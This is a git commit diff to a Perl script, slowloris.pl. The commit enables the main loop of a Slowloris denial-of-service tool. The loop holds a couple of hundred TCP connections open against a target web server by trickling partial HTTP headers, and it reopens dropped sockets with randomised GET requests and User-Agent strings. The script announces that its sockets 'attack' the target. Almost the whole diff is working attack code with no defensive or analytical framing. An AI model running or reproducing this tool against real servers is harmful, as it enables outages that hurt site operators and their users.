5ca490ce50c5c75df114c15eebc8fcf611d638f8
UnleashTheCode <danteodorandrei@outlook.com>
2019-05-31 20:36:03 +0000

    Update

--- slowloris.pl
+++ slowloris.pl
@@ -5,13 +5,14 @@ use warnings;
 
 use Getopt::Long;
 use Socket;
+use IO::Socket;
 
 my $target;
 my $port=80;
 my $socketc=200;
 my $sleeptime=1;
 my $verbose='';
-
+srand();
 
 GetOptions("target=s" => \$target,
 	"port=i" => \$port,
@@ -30,7 +31,7 @@ while(my $row =<$fh>){
 }
 close $fh;
 
-my @sockets;
+my (@sockets);
 my $proto=getprotobyname('tcp');
 my $iaddr=inet_aton($target) or die "Unable to connect to hostname";
 my $paddr=sockaddr_in($port,$iaddr);
@@ -44,30 +45,34 @@ for(1..$socketc){
 	if($verbose){
 		print "$_ socket created, connected, sent the Header.\n";
 	}
+
 }
+
 print "All $socketc are connected and they attack $target.";
 
+for(;;){
+	my $place=1;
+	foreach my $item (@sockets){
+		send($item,"X-a: ".int(rand(5000))."\r\n",0);# or splice(@sockets,$place,1);
+		$place=$place+1;	
+	}
+	my $diff=@sockets;
+	$diff=$socketc-$diff;
+	for(0..$diff){
+        socket($sockets[$_],AF_INET,SOCK_STREAM,$proto) or die $!;
+        connect($sockets[$_],$paddr) or die "Couldn't connect the socket: $!";
+        send($sockets[$_],"GET /".int(rand(2000))." HTTP/1.1\r\n",0);
+        send($sockets[$_],"User-Agent: ".$agents[rand(@agents)]."\r\n",0);
+        send($sockets[$_],"Accept-language: en-US,en,q=0.5\r\n",0);
+        if($verbose){
+            print "$_ socket created, connected, sent the Header.";
+        }
 
-# for(;;){
-# 	foreach (@sockets){
-# 		# send($_,"X-a: ".int(rand(5000))."\r\n",0);
-# 		# send($_,"X-a: ".int(rand(5000))."\r\n",0)  or splice(@sockets,1,1);
-# 		}
-# 	my $diff=@sockets;
-# 	for($diff..($socketc-$diff)){
-#         socket($sockets[$_],AF_INET,SOCK_STREAM,$proto) or die $!;
-#         connect($sockets[$_],$paddr) or die "Couldn't connect the socket: $!";
-#         send($sockets[$_],"GET /".int(rand(2000))." HTTP/1.1\r\n",0);
-#         send($sockets[$_],"User-Agent: ".$agents[rand(@agents)]."\r\n",0);
-#         send($sockets[$_],"Accept-language: en-US,en,q=0.5\r\n",0);
-#         if($verbose){
-#             print "$_ socket created, connected, sent the Header.";
-#         }
-# 	}
-# 	# for(1..$socketc){
-# 	# send($sockets[$_],"X-a: ".int(rand(5000))."\r\n",0);
-# 	# # print "Sent.";
-# 	# }
-# 	# print "Sleeping for $sleeptime";
-# 	# sleep $sleeptime;
-# }
+	}
+	print "Sleeping for $sleeptime";
+	sleep $sleeptime;
+}
+
+foreach (@sockets){
+	close($_);
+}
